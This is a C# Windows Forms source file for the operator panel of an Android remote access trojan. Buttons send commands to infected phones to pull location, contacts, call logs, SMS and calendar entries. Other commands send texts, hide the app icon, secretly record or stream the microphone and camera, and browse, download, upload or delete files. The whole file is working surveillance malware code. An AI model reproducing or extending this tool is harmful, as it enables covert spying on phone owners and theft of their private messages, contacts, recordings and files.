using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using sCore.RAT;

namespace AndroidExtension
{
    /// <summary>
    /// Handle UI action and visually represent actions and data
    /// </summary>
    public partial class AndroidUI : Form
    {
        #region Variables

        /// <summary>
        /// Class1 Reference
        /// </summary>
        Class1 ctx;
        /// <summary>
        /// SmsView Form reference
        /// </summary>
        private SmsView smsDisplay;
        /// <summary>
        /// Image View Form Reference
        /// </summary>
        private ImageView img;
        /// <summary>
        /// The last user defined video stream send delay
        /// </summary>
        private int videoStreamDelay;
        /// <summary>
        /// The current directory of the file browser
        /// </summary>
        private string currentDir = "";

        #endregion

        #region UI Functions

        /// <summary>
        /// AndroidUI Constructor
        /// </summary>
        /// <param name="ratCom">A Class1 reference</param>
        public AndroidUI(Class1 ratCom)
        {
            InitializeComponent(); //Display controls
            try
            {
                ctx = ratCom; //Set class1 reference
                //Attach to events
                ctx.ClientJoined += new Action<string>(OnNewClient);
                ctx.ClientDisconnected += new Action<string>(OnClientDisconnected);
                ctx.ContactsListReveived += new Action<Dictionary<string, string>>(OnContactsList);
                ctx.CallLogReceived += new Action<List<Class1.CallData>>(OnCallLogList);
                ctx.SmsDataReceived += new Action<List<Class1.SmsData>>(OnSmsList);
                ctx.CalendarDataReceived += new Action<List<Class1.EventData>>(OnEventList);
                ctx.PhotoReceived += new Action<byte[]>(OnPhoto);
                ctx.VideoReceived += new Action<byte[]>(OnFrame);
                ctx.FilesReceived += new Action<List<Class1.FileData>>(OnFiles);
                ctx.FileOperationResult += new Action<Class1.FileOperation>(FileOpResult);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Android UI Load\r\nError: " + ex.Message);
            }
        }

        /// <summary>
        /// Starts the dismissing thread for the notify label
        /// </summary>
        private void LabelDismiss()
        {
            Task.Factory.StartNew(new Action(() => DismissThread())); //Start the new thread
        }

        /// <summary>
        /// Hide the notify label
        /// </summary>
        private void DismissThread()
        {
            Thread.Sleep(5000); //Wait a bit
            label2.Invoke(new Action(() => label2.Visible = false)); //Hide the label
        }

        /// <summary>
        /// Get the camera facing option
        /// </summary>
        /// <param name="functionTitle">The function which the facing will be supplied to</param>
        /// <returns>The camera facing, null if invalid value supplied</returns>

        private string GetCameraFacing(string functionTitle)
        {
            //Get facing option
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox(functionTitle, "Do you want to use the \"front\" ot the \"back\" camera");
            if (ibv.dialogResult != DialogResult.OK) return null; //If dialog cancelled
            string opt = ibv.result.ToLower(); //Convert result to lower case chars
            if (opt != "front" && opt != "back") return null; //Filter valid results
            return opt; //Return valid result
        }

        /// <summary>
        /// Get the video stream delay option
        /// </summary>
        /// <returns>Video stream delay, null if invalid valwue supplied</returns>

        private string GetTapDelay()
        {
            //Get the delay value
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Image Send Delay", "Type in a delay in seconds, decimal point allowed");
            if (ibv.dialogResult != DialogResult.OK) return null; //If dialog cancelled
            string opt = ibv.result.ToLower(); //Convert result to lower case
            if (!float.TryParse(opt, out float test) && !int.TryParse(opt, out int test2)) return null; //if invalid float & invalid int
            opt = opt.Replace(System.Globalization.NumberFormatInfo.CurrentInfo.NumberDecimalSeparator, "."); //replace the decimal separator with "."
            test *= 1000; //convert the seconds to milliseconds
            videoStreamDelay = (int)Math.Round(test); //Do a math.round, in case the result is still a float, set the delay value
            return opt; //return the delay value
        }

        /// <summary>
        /// Get video stream quality
        /// </summary>
        /// <returns>A quality between 0 and 100, null if invalid valu supplied</returns>

        private string GetTapQuality()
        {
            //Get the quality
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Image Quality", "Type in the quality of the image (0-100)");
            if (ibv.dialogResult != DialogResult.OK) return null; //if dialog cancelled
            string opt = ibv.result.ToLower(); //Convert to lower case
            bool validInput = int.TryParse(opt, out int result);  //Try to convert input to int
            if (!validInput || result < 0 || result > 100) return null; //if invalid input or quality out of range
            return opt; //return the quality
        }

        /// <summary>
        /// Reset the context.expectVideo value
        /// </summary>

        private void ResetExpectVideo()
        {
            Thread.Sleep(videoStreamDelay + 5000); //Sleep for the send delay + 5 seconds
            ctx.expectVideo = false; //reset the value
        }

        #region Event Handlers

        /// <summary>
        /// FileOperatioResult Event handle
        /// </summary>
        /// <param name="opResult">The operation result</param>
        private void FileOpResult(Class1.FileOperation opResult)
        {
            //Display result
            MessageBox.Show(opResult.message, opResult.name, MessageBoxButtons.OK, (opResult.success) ? MessageBoxIcon.Information : MessageBoxIcon.Warning);
        }

        /// <summary>
        /// File listing event handler
        /// </summary>
        /// <param name="fileList">The list of file data</param>
        private void OnFiles(List<Class1.FileData> fileList)
        {
            //Clear file list view
            listView4.Items.Clear();

            //Loop through files
            foreach (Class1.FileData file in fileList)
            {
                //Create file list view item
                ListViewItem lvi = new ListViewItem()
                {
                    Text = file.name
                };
                lvi.SubItems.Add(file.size.ToString());
                lvi.SubItems.Add(file.path);
                lvi.Tag = file.isDir;

                //Add item to the listView
                listView4.Items.Add(lvi);
            }
        }

        /// <summary>
        /// Video frame event handler
        /// </summary>
        /// <param name="videoFrame">The video frame byte array</param>
        private void OnFrame(byte[] videoFrame)
        {
            if (img == null) return; //Check if we have an imageView form
            try
            {
                Image frame = (Bitmap)((new ImageConverter()).ConvertFrom(videoFrame)); //Convert byte array to image object
                img.UpdateImage(frame); //Update the image on the imageView Form
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to convert bytes to image: " + ex.ToString());
            }
        }

        /// <summary>
        /// Photo received event handler
        /// </summary>
        /// <param name="jpegBytes">The jpeg image bytes array</param>
        private void OnPhoto(byte[] jpegBytes)
        {
            Image photo = (Bitmap)((new ImageConverter()).ConvertFrom(jpegBytes)); //Convert byte array to image object
            if (img != null) img.Close(); //Close the imageView if it's opened
            img = new ImageView(); //Create a new imeageView
            img.Show(); //Open the imageView
            img.UpdateImage(photo); //Update the image
        }

        /// <summary>
        /// List calendar events event handler
        /// </summary>
        /// <param name="events">List of calendar events</param>
        private void OnEventList(List<Class1.EventData> events)
        {
            //Clear the calendar listView
            listView3.Items.Clear();

            foreach (Class1.EventData e in events)
            {
                //Create calendar listView items
                ListViewItem lvi = new ListViewItem()
                {
                    Tag = e,
                    Text = e.id
                };
                lvi.SubItems.Add(e.name);
                //Add the listView item to the listView
                listView3.Items.Add(lvi);
            }
        }

        /// <summary>
        /// Sms Messages event handler
        /// </summary>
        /// <param name="messages">List of sms messages</param>
        private void OnSmsList(List<Class1.SmsData> messages)
        {
            if (smsDisplay != null) //Close sms display if it's open
            {
                smsDisplay.Close();
                smsDisplay.Dispose();
                smsDisplay = null;
            }
            smsDisplay = new SmsView(messages); //Create a new SmsView
            smsDisplay.Show(); //Display the smsView
        }

        /// <summary>
        /// List call log event handler
        /// </summary>
        /// <param name="callData">List of call data</param>
        private void OnCallLogList(List<Class1.CallData> callData)
        {
            //Clear the call log list view
            if (listView2.Items.Count > 0) listView2.Items.Clear();

            //Loop through the call log
            foreach (Class1.CallData cd in callData)
            {
                //Create call log listView item
                ListViewItem lvi = new ListViewItem()
                {
                    Text = cd.phoneNumber
                };
                lvi.SubItems.Add(cd.callType);
                lvi.SubItems.Add(cd.callDuration.ToString());
                lvi.SubItems.Add(cd.callDate);
                //Add listViewItem to the listView
                listView2.Items.Add(lvi);
            }
        }

        /// <summary>
        /// Contact list Event handler
        /// </summary>
        /// <param name="contactList">List of contacts</param>
        private void OnContactsList(Dictionary<String, String> contactList)
        {
            //Clear the contacts listview
            listView1.Items.Clear();

            //Loop through the contacts
            foreach (KeyValuePair<String, String> kvp in contactList)
            {
                //Create the listView item for contact
                ListViewItem lvi = new ListViewItem()
                {
                    Text = kvp.Key
                };
                lvi.SubItems.Add(kvp.Value);
                //Add listViewItem to listView
                listView1.Items.Add(lvi);
            }
        }

        /// <summary>
        /// New Connection event handler
        /// </summary>
        /// <param name="clientName">The name of the new client</param>
        private void OnNewClient(string clientName)
        {
            comboBox1.Items.Add(clientName); //add the client name to the combobox
        }

        /// <summary>
        /// Disconnect Event Handler
        /// </summary>
        /// <param name="clientName">The name of the disconnected client</param>
        private void OnClientDisconnected(string clientName)
        {
            if (comboBox1.SelectedItem.ToString() == clientName) //If current client disconnected, notify user
            {
                label2.Visible = true;
                comboBox1.Text = "";
                comboBox1.SelectedItem = null;
            }
            comboBox1.Items.Remove(clientName); //Remove client from the Combobox
            LabelDismiss(); //Start dismissing the label
        }

        #endregion

        #region Control Events

        #pragma warning disable IDE1006

        /// <summary>
        /// Test Connection Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("test");
        }

        /// <summary>
        /// Change the controlled client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedItem != null) //If combobox has a selected item
            {
                ctx.SetCurrentClient(comboBox1.SelectedIndex); //Set the current client
            }
        }

        /// <summary>
        /// Get Location Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("gps");
        }

        /// <summary>
        /// Get Battery Information Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button3_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("battery");
        }

        /// <summary>
        /// Get Contacts Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button4_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("contacts");
        }

        /// <summary>
        /// Get contact details tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void getContactDetailsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return; //if no selected contact return

            string id = listView1.SelectedItems[0].SubItems[0].Text; //Get the id of the selected contact

            ctx.SendCommand("contact|" + id); //Send command
        }

        /// <summary>
        /// Add contact tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addContactToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddContact acDialog = new AddContact(ctx); //Create new addContact dialog
            acDialog.ShowDialog(); //Show the dialog
        }

        /// <summary>
        /// Get Call Log Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button5_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("calllog");
        }

        /// <summary>
        /// Get SMS Messages Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button6_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("sms");
        }

        /// <summary>
        /// Send SMS Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button7_Click(object sender, EventArgs e)
        {
            //Get recipient phone number
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Send SMS", "Please type in the phone number of the recipient!");
            if (ibv.dialogResult != DialogResult.OK) return; //if dialog cancelled return
            string phoneNumber = ibv.result;
            //Get the message
            ibv = ServerSettings.ShowInputBox("Send SMS", "Please type in the message you wish to send!");
            if (ibv.dialogResult != DialogResult.OK) return; //if dialog cancelled return
            string message = ibv.result;

            string command = "send-sms|" + phoneNumber + "|" + message.Replace("|", string.Empty); //Construct command
            ctx.SendCommand(command); //Send Command
            MessageBox.Show("SMS Message Sent", "Send SMS", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// Hide App Icon Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button8_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("self-hide");
        }

        /// <summary>
        /// Show Application Icon Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button9_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("self-show");
        }

        /// <summary>
        /// List Calendar Events Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button10_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("calendar");
        }

        /// <summary>
        /// Add calendar event button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addEventToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddEvent eventUI = new AddEvent(ctx, AddEvent.MODE_ADD); //Create new AddEvent dialog
            eventUI.Show(); //Show the form
        }

        /// <summary>
        /// Display Event Details tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 1)
            {
                string displayText = "";
                Class1.EventData edata = (Class1.EventData)listView3.SelectedItems[0].Tag;
                displayText = "Description: " + edata.description + Environment.NewLine +
                    "Location: " + edata.location + Environment.NewLine +
                    "Starting Time: " + edata.startTime + Environment.NewLine +
                    "Ending Time: " + edata.endTime;

                MessageBox.Show(displayText, "Event Data", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Modify Event Tool Strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void changeEventToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 1) //If event selected
            {
                Class1.EventData edata = (Class1.EventData)listView3.SelectedItems[0].Tag; //Get the event data
                AddEvent eventUI = new AddEvent(ctx, AddEvent.MODE_EDIT); //Create new AddEvent Dialog
                eventUI.Show(); //Show the form
                eventUI.LoadEvent(edata); //Load the event data to the form
            }
        }

        /// <summary>
        /// Delete event tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteEventToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 1) //If event selected
            {
                Class1.EventData edata = (Class1.EventData)listView3.SelectedItems[0].Tag; //Get the event data
                string command = "delete-calendar|" + edata.id; //Send command
            }
        }
        
        /// <summary>
        /// Start recording mic Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button11_Click(object sender, EventArgs e)
        {
            if (button11.Text.StartsWith("Start")) //If not recording
            {
                ctx.SendCommand("mic-record-start"); //Send command
                button11.Text = "Stop Recording Mic"; //Change state
                button12.Enabled = false; //prevent mic streaming
                return;
            }
            
            if (button11.Text.StartsWith("Stop")) //If recording
            {
                ctx.SendCommand("mic-record-stop"); //Send command
                button11.Text = "Start Recording Mic"; //Change state
                button12.Enabled = true; //Allow mic streaming
            }
        }

        /// <summary>
        /// Start Mic Stream Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button12_Click(object sender, EventArgs e)
        {
            if (button12.Text.StartsWith("Start")) //Stream not started
            {
                ctx.InitAudioStream(); //Init playback on context
                button12.Text = "Stop Tapping Mic"; //Change state
                ctx.SendCommand("mic-tap-start"); //Send command
                button11.Enabled = false; //Prevent mic recording
                return;
            }

            if (button12.Text.StartsWith("Stop")) //Stream started
            {
                ctx.SendCommand("mic-tap-stop"); //Send command
                Thread.Sleep(3000); //Wait for client to stop stream
                ctx.DestroyAudioStream(); //Dispose playback on context
                button11.Enabled = true; //Allow mic recording
                button12.Text = "Start Tapping Mic"; //Change State
            }
        }
        
        /// <summary>
        /// Take a photo button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button13_Click(object sender, EventArgs e)
        {
            //Get the cam facing option
            string opt = GetCameraFacing("Take a photo");
            if (opt == null) return;
            //Set context to expect photo
            ctx.expectPhoto = true;
            //Send Command
            ctx.SendCommand("cam-photo|" + opt);
        }

        /// <summary>
        /// Record Video Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button14_Click(object sender, EventArgs e)
        {
            if (button14.Text.StartsWith("Start")) //Not recording
            {
                //Get cam facing
                string opt = GetCameraFacing("Record Video");
                if (opt == null) return;
                button13.Enabled = false; //Prevent photo
                button15.Enabled = false; //Prevent video stream
                ctx.SendCommand("cam-record-start|" + opt); //Send command
                button14.Text = "Stop Recording Cam"; //Change state
                return;
            }

            if (button14.Text.StartsWith("Stop")) //Recording
            {
                ctx.SendCommand("cam-record-stop"); //Send Command
                button13.Enabled = true; //Allow photo
                button15.Enabled = true; //Allow Video Stream
                button14.Text = "Start Recording Cam"; //Change State
            }
        }

        /// <summary>
        /// Video Stream Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button15_Click(object sender, EventArgs e)
        {
            if (button15.Text.StartsWith("Start")) //Not Streaming
            {
                //Get cam facing
                string opt = GetCameraFacing("Tap Camera");
                if (opt == null) return;
                //Get frame quality
                string opt2 = GetTapQuality();
                if (opt2 == null) return;
                //Get send delay
                string opt3 = GetTapDelay();
                if (opt3 == null) return;
                ctx.expectVideo = true; //Context expect video frames
                button13.Enabled = false; //Prevent photo
                button14.Enabled = false; //Prevent video recording
                if (img != null) img.Close(); //If imageView open then close it
                img = new ImageView(true); //Stream Mode = true (auto rotate new images)
                img.Show(); //Display imageView
                ctx.SendCommand("cam-tap-start|" + opt + "|" + opt2 + "|" + opt3); //Send command
                button15.Text = "Stop Tapping Cam"; //Change State
                return;
            }

            if (button15.Text.StartsWith("Stop")) //Streaming
            {
                ctx.SendCommand("cam-tap-stop"); //Send Command
                Thread t = new Thread(new ThreadStart(ResetExpectVideo)); //Create context expectation reset thread
                t.Start(); //Start that thread
                if (img != null) img.Close(); //close imageView
                img.Dispose(); //Dispose imageView
                img = null; //set imageView to null
                button13.Enabled = true; //Allow taking photo
                button14.Enabled = true; //Allow recording video
                button15.Text = "Start Tapping Cam"; //Change State
            }
        }

        /// <summary>
        /// List Files Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("flist"); //Send Command
            currentDir = "/"; //Set current dir
        }

        /// <summary>
        /// Enter Directory Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void enterDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get the selected file
            string dir = GetSelectedFile();
            if (dir == null) return;
            ctx.SendCommand("flist|" + dir); //Send command
            currentDir = dir; //Update current dir
        }

        /// <summary>
        /// Get the selected file in the file browser listView
        /// </summary>
        /// <returns>The selected file's full path, null if nothing is selected</returns>
        private string GetSelectedFile()
        {
            if (listView4.SelectedItems.Count == 1)
            {
                return listView4.SelectedItems[0].SubItems[2].Text;
            }

            return null;
        }

        /// <summary>
        /// Move File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void moveFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get the selected file
            string file = GetSelectedFile();
            if (file == null) return;
            ctx.SendCommand("fmove|" + file); //Send Command
        }

        /// <summary>
        /// Copy File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            ctx.SendCommand("fcopy|" + file); //Send Command
        }

        /// <summary>
        /// Paste File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pasteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("fpaste|" + currentDir);
        }

        /// <summary>
        /// Delete file tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            ctx.SendCommand("fdel|" + file); //Send Command
        }

        /// <summary>
        /// Rename File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            //Get the new name for the file
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Rename File", "Type in the new desired name for the file");
            if (ibv.dialogResult != DialogResult.OK) return; //if dialog cancelled
            string name = ibv.result;
            ctx.SendCommand("frename|" + file + "|" + name); //Send command
        }

        /// <summary>
        /// Download file tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            //Get download location
            SaveFileDialog sfd = new SaveFileDialog()
            {
                Title = "Select where you want to save the downloaded file"
            };
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                ctx.dlFilePath = sfd.FileName;
            }
            else return;
            ctx.SendCommand("fdownload|" + file); //Send command
        }

        /// <summary>
        /// Upload File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void uploadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Select file to upload
            OpenFileDialog ofd = new OpenFileDialog()
            {
                Title = "Please select a location for the file"
            };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string file = ofd.FileName;
                long length = new System.IO.FileInfo(file).Length; //Get file size in bytes
                ctx.ulFilePath = file; //Set context upload file path
                ctx.SendCommand("fupload|" + currentDir + "/" + new System.IO.FileInfo(file).Name + "|" + length); //Send command
            }
        }

        /// <summary>
        /// Up 1 Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (currentDir.IndexOf('/') == currentDir.LastIndexOf('/')) ctx.SendCommand("flist"); //up1 is root -> /
            else if (currentDir == "/") return; //up1 is nothing because we are on the top
            else //need to calcualte up1
            {
                currentDir = currentDir.Substring(0, currentDir.LastIndexOf('/')); //Set the new current dir, calculate the parent directory
                ctx.SendCommand("flist|" + currentDir); //Send command
            }
        }

    #endregion

#endregion
    }
}
